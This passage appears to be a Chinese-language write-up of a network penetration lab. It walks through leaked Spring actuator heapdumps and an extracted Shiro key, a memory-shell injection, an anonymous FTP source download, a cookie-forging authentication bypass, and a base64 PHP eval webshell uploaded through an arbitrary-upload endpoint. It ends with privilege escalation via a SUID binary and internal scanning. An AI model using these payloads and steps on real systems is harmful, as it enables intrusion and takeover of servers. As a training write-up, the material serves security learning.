</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  104B  - /actuator/events<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  104B  - /actuator/flyway<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  106B  - /actuator/features<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  112B  - /actuator/gateway/routes<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:16<span class=o>]</span> <span class=m>404</span> -  109B  - /actuator/healthcheck<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:16<span class=o>]</span> <span class=m>200</span> -  167B  - /actuator/health<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:16<span class=o>]</span> <span class=m>404</span> -  107B  - /actuator/liquibase<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:16<span class=o>]</span> <span class=m>404</span> -  105B  - /actuator/logfile<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:16<span class=o>]</span> <span class=m>200</span> -   50KB - /actuator/loggers<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:16<span class=o>]</span> <span class=m>404</span> -  111B  - /actuator/loggingConfig<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:16<span class=o>]</span> <span class=m>404</span> -  108B  - /actuator/management<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:16<span class=o>]</span> <span class=m>200</span> -   22KB - /actuator/mappings<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:16<span class=o>]</span> <span class=m>200</span> - 1018B  - /actuator/metrics<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:16<span class=o>]</span> <span class=m>404</span> -  116B  - /actuator/registeredServices<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:16<span class=o>]</span> <span class=m>404</span> -  115B  - /actuator/releaseAttributes<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:16<span class=o>]</span> <span class=m>404</span> -  106B  - /actuator/sessions<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:16<span class=o>]</span> <span class=m>404</span> -  105B  - /actuator/refresh<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:16<span class=o>]</span> <span class=m>404</span> -  111B  - /actuator/springWebflow<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:16<span class=o>]</span> <span class=m>404</span> -  115B  - /actuator/resolveAttributes<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:16<span class=o>]</span> <span class=m>404</span> -  106B  - /actuator/shutdown<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:16<span class=o>]</span> <span class=m>404</span> -  108B  - /actuator/prometheus<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:16<span class=o>]</span> <span class=m>200</span> -   54B  - /actuator/scheduledtasks<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:16<span class=o>]</span> <span class=m>404</span> -  101B  - /actuator/sso<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:16<span class=o>]</span> <span class=m>404</span> -  109B  - /actuator/ssoSessions<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:16<span class=o>]</span> <span class=m>404</span> -  112B  - /actuator/hystrix.stream<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:16<span class=o>]</span> <span class=m>404</span> -  107B  - /actuator/httptrace<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:16<span class=o>]</span> <span class=m>200</span> -    2B  - /actuator/info<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:16<span class=o>]</span> <span class=m>200</span> -   85KB - /actuator/threaddump<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:16<span class=o>]</span> <span class=m>404</span> -  114B  - /actuator/integrationgraph<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:16<span class=o>]</span> <span class=m>404</span> -  105B  - /actuator/jolokia<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:16<span class=o>]</span> <span class=m>404</span> -  108B  - /actuator/statistics<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:16<span class=o>]</span> <span class=m>200</span> -   14KB - /actuator/configprops<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:16<span class=o>]</span> <span class=m>404</span> -  104B  - /actuator/status<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:17<span class=o>]</span> <span class=m>404</span> -  103B  - /actuator/trace<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:17<span class=o>]</span> <span class=m>200</span> -   27MB - /actuator/heapdump<span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>解密一下heapdump，只保留了关键部分</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-dockerfile data-lang=dockerfile><span class=line><span class=cl>D:<span class=se>\C</span>TFtools<span class=se>\工</span>具包--天狐渗透V1.2<span class=se>\g</span>ui_scan<span class=se>\h</span>eapdump&gt;java -jar JDumpSpider-1.1-SNAPSHOT-full.jar C:<span class=se>\U</span>sers<span class=se>\1</span>4301<span class=se>\D</span>esktop<span class=se>\h</span>eapdump.heapdump<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>===========================================</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>CookieRememberMeManager<span class=o>(</span>ShiroKey<span class=o>)</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>-------------<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=nv>algMode</span> <span class=o>=</span> GCM, <span class=nv>key</span> <span class=o>=</span> AZYyIgMYhG6/CzIJlvpR2g<span class=o>==</span>, <span class=nv>algName</span> <span class=o>=</span> AES<span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>===========================================</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>​<img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/image-20250309022956-d7n76ty.png alt=image>​</p><p>找到了密钥和利用链，但是目前的用户是ops01</p><p>注入哥斯拉内存马</p><p>​<img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/image-20250309023327-xxr1bb8.png alt=image>​</p><p>设置代理进行连接</p><p>然后在/home/ops01下发现了文件</p><p>​<img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/image-20250309023651-gd3r8e5.png alt=image>​</p><p>由于不熟悉pwn，这一部分不做赘述，只说一个小点</p><p>在exp前面加上这一段设置为你做的代理即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-dockerfile data-lang=dockerfile><span class=line><span class=cl>socks.set_default_proxy<span class=o>(</span>socks.SOCKS5, <span class=s2>&#34;127.0.0.1&#34;</span>, 1080<span class=o>)</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>socket.socket <span class=o>=</span> socks.socksocket<span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>现在开始看新翔OA，依据之前的扫描结果21端口开放得到相关源码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-dockerfile data-lang=dockerfile><span class=line><span class=cl>root@joker:/home/Work# proxychains ftp 172.28.23.26<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>ProxyChains-3.1 <span class=o>(</span>http://proxychains.sf.net<span class=o>)</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=p>|</span>S-chain<span class=p>|</span>-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-172.28.23.26:21-&lt;&gt;&lt;&gt;-OK<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>Connected to 172.28.23.26.<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=m>220</span> <span class=o>(</span>vsFTPd 3.0.3<span class=o>)</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>Name <span class=o>(</span>172.28.23.26:root<span class=o>)</span>: anonymous<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=m>331</span> Please specify the password.<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>Password:<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=m>230</span> Login successful.<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>Remote system <span class=nb>type</span> is UNIX.<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>Using binary mode to transfer files.<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>ftp&gt; passive<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>Passive mode on.<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>ftp&gt; dir<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=m>227</span> Entering Passive Mode <span class=o>(</span>172,28,23,26,21,118<span class=o>)</span>.<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=p>|</span>S-chain<span class=p>|</span>-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-172.28.23.26:5494-&lt;&gt;&lt;&gt;-OK<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=m>150</span> Here comes the directory listing.<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>-rw-r--r--    <span class=m>1</span> <span class=m>0</span>        <span class=m>0</span>         <span class=m>7536672</span> Mar <span class=m>23</span>  <span class=m>2024</span> OASystem.zip<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>ftp&gt; get OASystem.zip<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>local: OASystem.zip remote: OASystem.zip<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=m>227</span> Entering Passive Mode <span class=o>(</span>172,28,23,26,179,32<span class=o>)</span>.<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=p>|</span>S-chain<span class=p>|</span>-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-172.28.23.26:45856-&lt;&gt;&lt;&gt;-OK<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=m>150</span> Opening BINARY mode data connection <span class=k>for</span> OASystem.zip <span class=o>(</span><span class=m>7536672</span> bytes<span class=o>)</span>.<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=m>226</span> Transfer complete.<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=m>500</span> Unknown command.<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=m>7536672</span> bytes received in 147.92 secs <span class=o>(</span>49.7565 kB/s<span class=o>)</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>ftp&gt; exit<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=m>221</span> Goodbye.<span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>然后得到源码，重点关注开头的引用文件</p><p>​<img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/image-20250309032654-7gr93xn.png alt=image>​</p><p>发现逻辑相对简单</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>islogin</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>   <span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_COOKIE</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>])</span><span class=o>&amp;&amp;</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_COOKIE</span><span class=p>[</span><span class=s1>&#39;loginname&#39;</span><span class=p>])</span><span class=o>&amp;&amp;</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_COOKIE</span><span class=p>[</span><span class=s1>&#39;jueseid&#39;</span><span class=p>])</span><span class=o>&amp;&amp;</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_COOKIE</span><span class=p>[</span><span class=s1>&#39;danweiid&#39;</span><span class=p>])</span><span class=o>&amp;&amp;</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_COOKIE</span><span class=p>[</span><span class=s1>&#39;quanxian&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>	   <span class=k>if</span><span class=p>(</span><span class=nv>$_COOKIE</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>]</span><span class=o>!=</span><span class=s1>&#39;&#39;</span><span class=o>&amp;&amp;</span><span class=nv>$_COOKIE</span><span class=p>[</span><span class=s1>&#39;loginname&#39;</span><span class=p>]</span><span class=o>!=</span><span class=s1>&#39;&#39;</span><span class=o>&amp;&amp;</span><span class=nv>$_COOKIE</span><span class=p>[</span><span class=s1>&#39;jueseid&#39;</span><span class=p>]</span><span class=o>!=</span><span class=s1>&#39;&#39;</span><span class=o>&amp;&amp;</span><span class=nv>$_COOKIE</span><span class=p>[</span><span class=s1>&#39;danweiid&#39;</span><span class=p>]</span><span class=o>!=</span><span class=s1>&#39;&#39;</span><span class=o>&amp;&amp;</span><span class=nv>$_COOKIE</span><span class=p>[</span><span class=s1>&#39;quanxian&#39;</span><span class=p>]</span><span class=o>!=</span><span class=s1>&#39;&#39;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	       <span class=k>return</span> <span class=k>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	   <span class=p>}</span>
</span></span><span class=line><span class=cl>	    <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	      <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	   <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	    <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>     <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>直接添加cookie就行</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>id</span><span class=o>=</span><span class=mi>1</span><span class=p>;</span><span class=nx>loginname</span><span class=o>=</span><span class=mi>1</span><span class=p>;</span><span class=nx>jueseid</span><span class=o>=</span><span class=mi>1</span><span class=p>;</span><span class=nx>danweiid</span><span class=o>=</span><span class=mi>1</span><span class=p>;</span><span class=nx>quanxian</span><span class=o>=</span><span class=mi>1</span>
</span></span></code></pre></td></tr></table></div></div><p>​<img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/image-20250309032850-2j6bt1b.png alt=image>​</p><p>然后开始发现在uploadbase64.php下可以任意上传文件</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=sd>/**
</span></span></span><span class=line><span class=cl><span class=sd> * Description: PhpStorm.
</span></span></span><span class=line><span class=cl><span class=sd> * Author: yoby
</span></span></span><span class=line><span class=cl><span class=sd> * DateTime: 2018/12/4 18:01
</span></span></span><span class=line><span class=cl><span class=sd> * Email:logove@qq.com
</span></span></span><span class=line><span class=cl><span class=sd> * Copyright Yoby版权所有
</span></span></span><span class=line><span class=cl><span class=sd> */</span>
</span></span><span class=line><span class=cl><span class=nv>$img</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;imgbase64&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/^(data:\s*image\/(\w+);base64,)/&#39;</span><span class=p>,</span> <span class=nv>$img</span><span class=p>,</span> <span class=nv>$result</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$type</span> <span class=o>=</span> <span class=s2>&#34;.&#34;</span><span class=o>.</span><span class=nv>$result</span><span class=p>[</span><span class=mi>2</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nv>$path</span> <span class=o>=</span> <span class=s2>&#34;upload/&#34;</span> <span class=o>.</span> <span class=nx>date</span><span class=p>(</span><span class=s2>&#34;Y-m-d&#34;</span><span class=p>)</span> <span class=o>.</span> <span class=s2>&#34;-&#34;</span> <span class=o>.</span> <span class=nx>uniqid</span><span class=p>()</span> <span class=o>.</span> <span class=nv>$type</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$img</span> <span class=o>=</span>  <span class=nx>base64_decode</span><span class=p>(</span><span class=nx>str_replace</span><span class=p>(</span><span class=nv>$result</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=nv>$img</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>file_put_contents</span><span class=p>(</span><span class=nv>$path</span><span class=p>,</span> <span class=nv>$img</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>exit</span><span class=p>(</span><span class=s1>&#39;{&#34;src&#34;:&#34;&#39;</span><span class=o>.</span><span class=nv>$path</span><span class=o>.</span><span class=s1>&#39;&#34;}&#39;</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>然后准备一下payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>imgbase64</span><span class=o>=</span><span class=nx>data</span><span class=o>:</span><span class=nx>image</span><span class=o>/</span><span class=nx>php</span><span class=p>;</span><span class=nx>base64</span><span class=p>,</span><span class=nx>PD9waHAgQGV2YWwoJF9QT1NUWydhdHRhY2snXSk7Pz4</span><span class=o>=</span>
</span></span></code></pre></td></tr></table></div></div><p>设置一下bp的socks代理</p><p>​<img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/image-20250309033320-urofnf7.png alt=image>​</p><p>再正常抓包即可</p><p>​<img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/image-20250309033156-mm2cuob.png alt=image>​</p><p>上传成功开始连接</p><p>​<img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/image-20250309033633-2ovkdb2.png alt=image>​</p><p>很明显禁用了很多</p><p>另外这里使用插件绕过</p><p>​<img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/image-20250309035741-7luwdfl.png alt=image>​</p><p>但是发现post的无法执行，只能使用Get的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>/</span><span class=nx>upload</span><span class=o>/.</span><span class=nx>antproxy</span><span class=o>.</span><span class=nx>php</span><span class=o>?</span><span class=nx>pass</span><span class=o>=</span><span class=nx>system</span><span class=p>(</span><span class=o>%</span><span class=mi>22</span><span class=nx>find</span><span class=o>%</span><span class=mi>20</span><span class=o>/%</span><span class=mi>20</span><span class=o>-</span><span class=nx>perm</span><span class=o>%</span><span class=mi>20</span><span class=o>-</span><span class=nx>u</span><span class=o>=</span><span class=nx>s</span><span class=o>%</span><span class=mi>20</span><span class=o>-</span><span class=nx>type</span><span class=o>%</span><span class=mi>20</span><span class=nx>f</span><span class=o>%</span><span class=mi>202</span><span class=o>%</span><span class=mi>3</span><span class=nx>E</span><span class=o>/</span><span class=nx>dev</span><span class=o>/</span><span class=k>null</span><span class=o>%</span><span class=mi>22</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>​<img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/image-20250309040030-c3q3lys.png alt=image>​</p><p>这里发现有suid提权</p><p>使用base32</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>/.</span><span class=nx>antproxy</span><span class=o>.</span><span class=nx>php</span><span class=o>?</span><span class=nx>pass</span><span class=o>=</span><span class=nx>system</span><span class=p>(</span><span class=s2>&#34;base32 /flag02.txt&#34;</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>分别开始在查看网卡，进行扫描</p><p>​<img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/image-20250309114548-jz3cn2m.png alt=image>​</p><p>在ERP的这台机子上发现还有一个网卡</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>./</span><span class=nx>fscan</span> <span class=o>-</span><span class=nx>h</span> <span class=mf>172.22</span><span class=o>.</span><span class=mf>10.0</span><span class=o>/</span><span class=mi>24</span> <span class=o>&gt;</span> <span class=nx>result</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>┌──────────────────────────────────────────────┐</span>
</span></span><span class=line><span class=cl><span class=nx>│</span>    <span class=nx>___</span>                              <span class=nx>_</span>        <span class=nx>│</span>
</span></span><span class=line><span class=cl><span class=nx>│</span>   <span class=o>/</span> <span class=nx>_</span> <span class=nx>\</span>     <span class=nx>___</span>  <span class=nx>___</span> <span class=nx>_</span> <span class=nx>__</span> <span class=nx>__</span> <span class=nx>_</span>  <span class=nx>___</span><span class=o>|</span> <span class=o>|</span> <span class=nx>__</span>    <span class=nx>│</span>
</span></span><span class=line><span class=cl><span class=nx>│</span>  <span class=o>/</span> <span class=o>/</span><span class=nx>_\</span><span class=o>/</span><span class=nx>____</span><span class=o>/</span> <span class=nx>__</span><span class=o>|/</span> <span class=nx>__</span><span class=o>|</span> <span class=err>&#39;</span><span class=nx>__</span><span class=o>/</span> <span class=nx>_</span><span class=err>`</span> <span class=o>|/</span> <span class=nx>__</span><span class=o>|</span> <span class=o>|/</span> <span class=o>/</span>    <span class=nx>│</span>
</span></span><span class=line><span class=cl><span class=nx>│</span> <span class=o>/</span> <span class=o>/</span><span class=nx>_\\_____\__</span> <span class=nx>\</span> <span class=p>(</span><span class=nx>__</span><span class=o>|</span> <span class=o>|</span> <span class=o>|</span> <span class=p>(</span><span class=nx>_</span><span class=o>|</span> <span class=o>|</span> <span class=p>(</span><span class=nx>__</span><span class=o>|</span>   <span class=o>&lt;</span>     <span class=nx>│</span>
</span></span><span class=line><span class=cl><span class=nx>│</span> <span class=nx>\____</span><span class=o>/</span>     <span class=o>|</span><span class=nx>___</span><span class=o>/</span><span class=nx>\___</span><span class=o>|</span><span class=nx>_</span><span class=o>|</span>  <span class=nx>\__</span><span class=p>,</span><span class=nx>_</span><span class=o>|</span><span class=nx>\___</span><span class=o>|</span><span class=nx>_</span><span class=o>|</span><span class=nx>\_\</span>    <span class=nx>│</span>
</span></span><span class=line><span class=cl><span class=nx>└──────────────────────────────────────────────┘</span>
</span></span><span class=line><span class=cl>      <span class=nx>Fscan</span> <span class=nx>Version</span><span class=o>:</span> <span class=mf>2.0</span><span class=o>.</span><span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mo>03</span><span class=o>-</span><span class=mi>09</span> <span class=mi>11</span><span class=o>:</span><span class=mi>45</span><span class=o>:</span><span class=mi>20</span><span class=p>]</span> <span class=p>[</span><span class=nx>INFO</span><span class=p>]</span> <span class=nx>暴力破解线程数</span><span class=o>:</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mo>03</span><span class=o>-</span><span class=mi>09</span> <span class=mi>11</span><span class=o>:</span><span class=mi>45</span><span class=o>:</span><span class=mi>20</span><span class=p>]</span> <span class=p>[</span><span class=nx>INFO</span><span class=p>]</span> <span class=nx>开始信息扫描</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mo>03</span><span class=o>-</span><span class=mi>09</span> <span class=mi>11</span><span class=o>:</span><span class=mi>45</span><span class=o>:</span><span class=mi>20</span><span class=p>]</span> <span class=p>[</span><span class=nx>INFO</span><span class=p>]</span> <span class=nx>CIDR范围</span><span class=o>:</span> <span class=mf>172.22</span><span class=o>.</span><span class=mf>10.0</span><span class=o>-</span><span class=mf>172.22</span><span class=o>.</span><span class=mf>10.255</span>
